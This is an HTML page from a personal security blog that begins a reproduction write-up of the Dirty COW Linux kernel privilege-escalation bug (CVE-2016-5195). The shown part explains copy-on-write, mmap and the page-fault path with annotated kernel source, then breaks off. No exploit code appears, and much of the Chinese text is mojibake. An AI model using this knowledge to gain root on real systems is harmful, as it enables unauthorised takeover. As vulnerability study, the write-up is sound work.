

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
  <link rel="icon" href="/img/browser.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="korey0sh1">
  <meta name="keywords" content="">
  
    <meta name="description" content="å—¦å—¦å¦®çš„dirty ğŸ‚ğŸ‚">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2016-5195(Dirty Cow) Remake">
<meta property="og:url" content="http://example.com/2024/02/27/dirtycow/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="å—¦å—¦å¦®çš„dirty ğŸ‚ğŸ‚">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306210316.png">
<meta property="article:published_time" content="2024-02-27T03:01:04.000Z">
<meta property="article:modified_time" content="2024-03-06T13:09:49.261Z">
<meta property="article:author" content="korey0sh1">
<meta property="article:tag" content="OS">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306210316.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>CVE-2016-5195(Dirty Cow) Remake - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>korey0sh1</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>å‹é“¾</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306210514.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2016-5195(Dirty Cow) Remake"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        korey0sh1
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-02-27 11:01" pubdate>
          2024å¹´2æœˆ27æ—¥ ä¸Šåˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.6k å­—
        
      </span>
    

    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2016-5195(Dirty Cow) Remake</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2024å¹´3æœˆ6æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x00ï¼šå†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p>æŠŠA3ğŸ‘´çš„kernel â… å’Œkernel â…¡è¿½å®Œäº†</p>
<p>åº·åº·èƒ½ä¸èƒ½å¤ç°ä¸€äº›kernel CVE</p>
<h1 id="0x01ï¼šä¿¡æ¯æ”¶é›†"><a href="#0x01ï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01ï¼šä¿¡æ¯æ”¶é›†"></a>0x01ï¼šä¿¡æ¯æ”¶é›†</h1><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195">NVD - CVE-2016-5195 (nist.gov)</a></p>
<p>2016å¹´10æœˆ18æ—¥ï¼Œé»‘å®¢<code>Phil Oester</code>æäº¤äº†éšè—é•¿è¾¾9å¹´ä¹‹ä¹…çš„â€œè„ç‰›æ¼æ´ï¼ˆ<strong>Dirty COW</strong>ï¼‰â€0dayæ¼æ´ã€‚è¯¥æ¼æ´è¡¨æ˜<code>Linux</code>å†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆ<strong>Copy-on-Write</strong>)æ—¶å­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¯¼è‡´å¯ä»¥ç ´åç§æœ‰åªè¯»å†…å­˜æ˜ å°„ã€‚é»‘å®¢å¯ä»¥è·å–ä½æƒé™çš„æœ¬åœ°ç”¨æˆ·åï¼Œåˆ©ç”¨æ­¤æ¼æ´è·å–å…¶ä»–åªè¯»å†…å­˜æ˜ å°„çš„å†™æƒé™ï¼Œè¿›ä¸€æ­¥è·å–rootæƒé™ã€‚</p>
<p><strong>Dirty Cow</strong>åœ¨2.xåˆ°4.8.2åŠä»¥ä¸‹çš„<code>version</code>ä¸­éƒ½å¯ä»¥å®Œæˆåˆ©ç”¨ï¼Œä½œç”¨èŒƒå›´ååˆ†å¹¿æ³›ã€‚æœ€åï¼Œæ­¤æ¼æ´ç”±<code>linux</code>åˆ›å§‹äºº<strong>linus</strong>äº²æ‰‹ä¿®å¤</p>
<h1 id="0x02ï¼šå‰ç½®"><a href="#0x02ï¼šå‰ç½®" class="headerlink" title="0x02ï¼šå‰ç½®"></a>0x02ï¼šå‰ç½®</h1><p><strong>æ–‡ä¸­æ‰€æœ‰çš„æºç å‡ä¸º4.8.2 version</strong></p>
<h2 id="COWï¼ˆcopy-to-writeï¼‰"><a href="#COWï¼ˆcopy-to-writeï¼‰" class="headerlink" title="COWï¼ˆcopy-to-writeï¼‰"></a>COWï¼ˆcopy-to-writeï¼‰</h2><p>å†™æ—¶å¤åˆ¶ï¼ˆ<strong>Copy-on-Writeï¼ŒCOW</strong>ï¼‰æ˜¯ä¸€ç§è®¡ç®—æœºç¼–ç¨‹ä¸­çš„ä¼˜åŒ–æŠ€æœ¯ï¼Œé€šå¸¸ç”¨äºå¤„ç†å…±äº«æ•°æ®çš„æƒ…å†µã€‚åœ¨ä½¿ç”¨å†™æ—¶å¤åˆ¶æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨å¤šä¸ªå®¢æˆ·ç«¯ï¼ˆæˆ–è€…çº¿ç¨‹ï¼‰å…±äº«åŒä¸€ä»½æ•°æ®çš„æƒ…å†µä¸‹ï¼Œåªæœ‰åœ¨æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä¿®æ”¹æ•°æ®æ—¶æ‰ä¼šå¤åˆ¶æ•°æ®ï¼Œä»¥ç¡®ä¿ä¿®æ”¹æ“ä½œä¸ä¼šå½±å“å…¶ä»–å®¢æˆ·ç«¯ã€‚</p>
<p>å…·ä½“åˆ°<code>fork()</code>ä¸­æ¥è¯´ï¼Œçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹å…±äº«åŒä¸€ä¸ªé¡µæ¡†ï¼Œåªæœ‰å½“å…¶ä¸­ä¸¤æ–¹ä¸­çš„ä»»æ„ä¸€æ–¹è¯•å›¾ä¿®æ”¹è¯¥é¡µæ¡†ä¸­çš„å†…å®¹æ—¶ï¼Œæ‰ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„é¡µæ¡†ï¼Œå°†åŸå…ˆé¡µæ¡†çš„å†…å®¹<code>copy</code>åˆ°æ–°çš„é¡µæ¡†ï¼Œåœ¨æ–°çš„é¡µæ¡†è¿›è¡Œä¿®æ”¹</p>
<ul>
<li><code>fork()</code>æ‰§è¡Œåï¼Œçˆ¶å­è¿›ç¨‹å…±äº«æ‰€æœ‰é¡µæ¡†ï¼Œæ‰€æœ‰é¡µæ¡†è¢«æ ‡è®°ä¸º<code>read-only</code></li>
<li>å½“è¦ä¿®æ”¹é¡µæ¡†æ—¶ï¼Œå› ä¸ºæ˜¯<code>read-only</code>ï¼Œæ‰€ä»¥ä¼šè§¦å‘<code>page fault</code>ï¼ˆç¼ºé¡µå¼‚å¸¸ï¼‰â€”â€”å†…æ ¸æ‰ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„é¡µæ¡†</li>
</ul>
<p>å¤§è‡´æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚åˆ«éª‚äº†åˆ«éª‚äº†çŸ¥é“æˆ‘å­—ä¸‘å‘œå‘œå‘œ:ï¼ˆ</p>
<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121649.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />

<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121717.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />

<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121748.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />



<h3 id="mmapä¸COW"><a href="#mmapä¸COW" class="headerlink" title="mmapä¸COW"></a>mmapä¸COW</h3><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>mmap</code> å°†ä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜æ—¶ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶å…·æœ‰åªè¯»æƒé™è€Œæ²¡æœ‰å†™æƒé™æ—¶ï¼Œè‹¥æˆ‘ä»¬å°è¯•å‘è¿™ä¸ªæ˜ å°„åŒºåŸŸå†™å…¥æ•°æ®ï¼Œç³»ç»Ÿä¼šå¯åŠ¨å†™æ—¶å¤åˆ¶ï¼ˆ<strong>copy-on-write</strong>ï¼‰æœºåˆ¶ã€‚è¿™ä¼šå¯¼è‡´ç³»ç»Ÿå°†æ–‡ä»¶å†…å®¹çš„å‰¯æœ¬æ‹·è´åˆ°å†…å­˜ä¸­ï¼Œä»¥ä¾¿è¿›ç¨‹å¯ä»¥å¯¹è¿™ä¸ªåŒºåŸŸè¿›è¡Œä¿®æ”¹ï¼Œè€Œä¸ä¼šå½±å“åˆ°ç¡¬ç›˜ä¸ŠåŸå§‹æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<h2 id="ç¼ºé¡µå¼‚å¸¸-page-fault"><a href="#ç¼ºé¡µå¼‚å¸¸-page-fault" class="headerlink" title="ç¼ºé¡µå¼‚å¸¸ page fault"></a>ç¼ºé¡µå¼‚å¸¸ page fault</h2><p>å½“æ“ä½œç³»ç»Ÿå°è¯•è®¿é—®å­˜å‚¨å™¨ä¸­çš„é¡µé¢ï¼ˆé¡µï¼‰æ—¶ï¼Œå¦‚æœè¯¥é¡µå½“å‰ä¸åœ¨ä¸»å­˜ï¼ˆ<strong>RAM</strong>ï¼‰ä¸­ï¼Œå°±ä¼šå‘ç”Ÿç¼ºé¡µå¼‚å¸¸ï¼ˆ<strong>page fault</strong>ï¼‰ã€‚ç¼ºé¡µå¼‚å¸¸é€šå¸¸æ˜¯ç”±äºä»¥ä¸‹å‡ ç§æƒ…å†µå¼•èµ·çš„ï¼š</p>
<ol>
<li><strong>é¡µé¢ä¸åœ¨å†…å­˜ä¸­</strong>ï¼šå½“ç¨‹åºéœ€è¦è®¿é—®ä¸€ä¸ªé¡µé¢ï¼Œè€Œè¯¥é¡µé¢å°šæœªåŠ è½½åˆ°å†…å­˜ä¸­æ—¶ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºé¡µé¢æ›¾ç»åœ¨å†…å­˜ä¸­ï¼Œä½†å·²ç»è¢«æ¢å‡ºåˆ°ç£ç›˜ä¸Šï¼Œæˆ–è€…æ˜¯å› ä¸ºç¨‹åºè®¿é—®äº†ä¸€ä¸ªæ–°çš„é¡µé¢ã€‚</li>
<li><strong>éæ³•è®¿é—®</strong>ï¼šç¨‹åºå°è¯•è®¿é—®æœªè¢«åˆ†é…ç»™å®ƒçš„å†…å­˜åŒºåŸŸï¼Œæˆ–è€…è®¿é—®å·²ç»è¢«é‡Šæ”¾çš„å†…å­˜åŒºåŸŸã€‚</li>
<li><strong>é¡µé¢ä¿æŠ¤</strong>ï¼šç¨‹åºå°è¯•å†™å…¥åªè¯»çš„å†…å­˜åŒºåŸŸï¼Œæˆ–è€…æ‰§è¡Œæœªè¢«å…è®¸çš„æ“ä½œã€‚</li>
</ol>
<h3 id="å¤„ç†æµç¨‹"><a href="#å¤„ç†æµç¨‹" class="headerlink" title="å¤„ç†æµç¨‹"></a>å¤„ç†æµç¨‹</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__do_page_fault</span>()<br>	<span class="hljs-built_in">handle_mm_fault</span>()<br>		<span class="hljs-built_in">__handle_mm_fault</span>()<br>			<span class="hljs-built_in">handle_pte_fault</span>()<br>				<span class="hljs-built_in">do_fault</span>()<br>					<span class="hljs-built_in">do_cow_fault</span>()<br>				<span class="hljs-built_in">do_wp_page</span>()<br><br></code></pre></td></tr></table></figure>

<h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a>__do_page_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles page faults.  It determines the address,</span><br><span class="hljs-comment"> * and the problem, and then passes it off to one of the appropriate</span><br><span class="hljs-comment"> * routines.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function must have noinline because both callers</span><br><span class="hljs-comment"> * &#123;,trace_&#125;do_page_fault() have notrace on. Having this an actual function</span><br><span class="hljs-comment"> * guarantees there&#x27;s a function trace entry.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> noinline <span class="hljs-type">void</span><br>__do_page_fault(<span class="hljs-keyword">struct</span> pt_regs *regs, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> error_code,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address)<br>    <span class="hljs-comment">/*struct pt_regs *regsï¼šä¿å­˜äº†é¡µé¢é”™è¯¯å‘ç”Ÿæ—¶çš„ CPU å¯„å­˜å™¨çŠ¶æ€ã€‚</span><br><span class="hljs-comment">	  unsigned long error_codeï¼šé”™è¯¯ä»£ç ï¼Œç”¨äºæŒ‡ç¤ºé¡µé¢é”™è¯¯çš„ç±»å‹ã€‚</span><br><span class="hljs-comment">	  unsigned long addressï¼šå¼•å‘é¡µé¢é”™è¯¯çš„å†…å­˜åœ°å€ã€‚*/</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">tsk</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br>	<span class="hljs-type">int</span> fault, major = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;<br>	<br>    <span class="hljs-comment">/*ä»å½“å‰ä»»åŠ¡ç»“æ„ä¸­è·å–å†…å­˜ç®¡ç†ç»“æ„ mmï¼Œå¹¶é€šè¿‡è¯¥ç»“æ„æ‰¾åˆ°è§¦å‘é¡µé¢æ•…éšœçš„åœ°å€æ‰€å±çš„å†…å­˜åŒºåŸŸ vma*/</span><br>	tsk = current;<br>	mm = tsk-&gt;mm;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Detect and handle instructions that would cause a page fault for</span><br><span class="hljs-comment">	 * both a tracked kernel page and a userspace page.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (kmemcheck_active(regs))<br>		kmemcheck_hide(regs);<br>	prefetchw(&amp;mm-&gt;mmap_sem);<br><br>	<span class="hljs-keyword">if</span> (unlikely(kmmio_fault(regs, address)))<br>		<span class="hljs-keyword">return</span>;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * We fault-in kernel-space virtual memory on-demand. The</span><br><span class="hljs-comment">	 * &#x27;reference&#x27; page table is init_mm.pgd.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * NOTE! We MUST NOT take any locks for this case. We may</span><br><span class="hljs-comment">	 * be in an interrupt or a critical region, and should</span><br><span class="hljs-comment">	 * only copy the information from the master page table,</span><br><span class="hljs-comment">	 * nothing more.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * This verifies that the fault happens in kernel space</span><br><span class="hljs-comment">	 * (error_code &amp; 4) == 0, and that the fault was not a</span><br><span class="hljs-comment">	 * protection error (error_code &amp; 9) == 0.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;        <span class="hljs-comment">/*æ£€æŸ¥è§¦å‘é¡µé¢æ•…éšœçš„åœ°å€æ˜¯å¦ä½äºå†…æ ¸ç©ºé—´ã€‚ä½†è¿™è¾¹ä¸å¤ªå¯èƒ½å‘ç”Ÿç¼ºé¡µï¼Œæ‰€ä»¥ç”¨unlikelyå®ä¼˜åŒ–ï¼Ÿ*/</span><br>		<span class="hljs-keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;<span class="hljs-comment">/*ä¸‰ä¸ªæ ‡å¿—ä½ï¼šä½¿ç”¨äº†é¡µè¡¨é¡¹ä¿ç•™çš„æ ‡å¿—ä½ã€ç”¨æˆ·ç©ºé—´é¡µå¼‚å¸¸ã€é¡µä¿æŠ¤å¼‚å¸¸ï¼Œä¸‰ä¸ªæ ‡å¿—ä½éƒ½æ— è¯´æ˜æ˜¯ç”±å†…æ ¸è§¦å‘çš„å†…æ ¸ç©ºé—´çš„ç¼ºé¡µå¼‚å¸¸*/</span><br>			<span class="hljs-keyword">if</span> (vmalloc_fault(address) &gt;= <span class="hljs-number">0</span>)<br>				<span class="hljs-keyword">return</span>;<br><br>			<span class="hljs-keyword">if</span> (kmemcheck_fault(regs, address, error_code))<br>				<span class="hljs-keyword">return</span>;<br>		&#125;<br><br>		<span class="hljs-comment">/* Can handle a stale RO-&gt;RW TLB: */</span><br>		<span class="hljs-keyword">if</span> (spurious_fault(error_code, address))<br>			<span class="hljs-keyword">return</span>;<br><br>		<span class="hljs-comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span><br>		<span class="hljs-keyword">if</span> (kprobes_fault(regs))<br>			<span class="hljs-keyword">return</span>;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Don&#x27;t take the mm semaphore here. If we 